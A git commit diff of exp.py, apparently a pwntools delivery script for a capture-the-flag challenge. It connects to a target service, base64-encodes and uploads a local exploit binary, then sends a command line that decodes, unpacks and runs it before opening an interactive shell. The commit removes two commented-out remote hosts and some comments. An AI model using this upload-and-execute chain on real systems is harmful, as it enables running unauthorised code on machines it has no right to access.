dbe7b056b1556067961f3f8bf636ad473f005e97
赤道企鹅 <40513718+yikesoftware@users.noreply.github.com>
2021-03-08 22:11:34 +0800

    Update exp.py

--- exp.py
+++ exp.py
@@ -3,8 +3,6 @@ import time, os
 context.log_level = "debug"
 
 p = remote("127.0.0.1", 5555)
-#p = remote("sec.eqqie.cn", 5555)
-#p = remote("106.14.216.214", 52827)
 
 os.system("tar -czvf exp.tar.gz ./exp") # compress exp
 os.system("base64 exp.tar.gz > b64_exp") # base64 encode exp.tar.gz
@@ -24,6 +22,6 @@ while True:
     p.recv()
 f.close()
 
-p.sendline("base64 -d b64_exp > exp.tar.gz;tar -xzvf exp.tar.gz; chmod +x exp;/exp;") # decode to binary file && execute exploit
+p.sendline("base64 -d b64_exp > exp.tar.gz;tar -xzvf exp.tar.gz; chmod +x exp;/exp;")
 
-p.interactive() # result of system("    cat /fl*")
+p.interactive()
